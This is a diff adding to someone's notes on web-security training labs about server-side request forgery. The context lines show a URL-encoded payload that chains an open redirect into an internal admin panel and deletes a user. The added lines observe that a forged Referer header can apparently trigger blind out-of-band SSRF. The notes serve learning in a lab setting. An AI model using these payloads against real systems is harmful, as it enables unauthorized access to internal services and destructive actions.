@@ -58,3 +58,9 @@ Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurre
 Adding `/admin` to previous endpoint fails, so according to lab description we should fetch `http://192.168.0.12:8080/admin`
 
 Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin` accesses the admin panel and `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos` removes `carlos` user which solves the lab.
+
+## Blind SSRF with out-of-band detection
+
+Cannot be done because it requires Burp Collaborator - Pro only feature.
+
+Bur apparently it is enough to replace `Referer` header to our server FQDN, which will trigger `SSRF`, by server visiting provided URL.
